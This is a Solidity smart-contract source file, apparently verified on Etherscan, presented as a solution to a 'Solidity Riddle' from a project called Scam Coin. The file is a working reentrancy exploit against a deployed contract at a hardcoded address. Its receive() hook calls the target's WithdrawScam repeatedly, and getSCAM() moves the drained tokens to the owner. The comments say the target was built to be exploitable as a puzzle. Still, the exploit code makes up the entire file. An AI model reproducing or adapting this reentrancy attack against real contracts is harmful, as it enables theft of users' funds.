/**
 *Submitted for verification at Etherscan.io on 2021-07-12
*/

// Solidity Riddle:
// This is one possible soultion to hackable contract #2
// It uses a receive() function to plot a reentrancy attack.


// Website
// https://scam-coin.org/

// GitHub
// https://github.com/scamcoincrypto

// Reddit
// https://www.reddit.com/r/scam_coin/

// Telegram
// https://t.me/SCAM_Coin_Community


// WARNING
// This smart contract is designed to be exploitable!
// Don't deposit anything that you are not willing to lose!



pragma solidity =0.7.6;


contract hackContract {

    address public constant SCAM_TOKEN_ADDRESS = 0x51Ea02C339c6cd4DFEB64449da5341627d1E97Bb;
    address public constant HACKABLE_ADDRESS = 0xbe5E56769563Ddc088C0F6C47BC16B35Fbc804CB;
    
    address public Owner;

    
    constructor()
    {
        Owner = msg.sender;
    }
    
    
    function register() external
    {
        hackable target = hackable(HACKABLE_ADDRESS);
        target.DepositBnb();
    }
    
    
    function deleteAccount() external
    {
        hackable target = hackable(HACKABLE_ADDRESS);
        target.deleteAccount();
    }
    
    function getSCAM() external
    {
        BEP20 scam = BEP20(SCAM_TOKEN_ADDRESS);
        scam.transfer(Owner, scam.balanceOf(address(this)));
    }
    
    
    receive() external payable
    {
        hackable target = hackable(HACKABLE_ADDRESS);
        target.WithdrawScam(10 ** 18);
    }
        
}





// Interface for BEP20
abstract contract BEP20 {
    
    function balanceOf(address tokenOwner) virtual external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
    function transferFrom(address owner, address buyer, uint numTokens) virtual external returns (bool);
    function totalSupply() virtual external view returns (uint256);
}



abstract contract hackable {
    
    function DepositBnb() virtual public payable;
    function deleteAccount() virtual external;
    function WithdrawScam(uint256 amount) virtual public;
}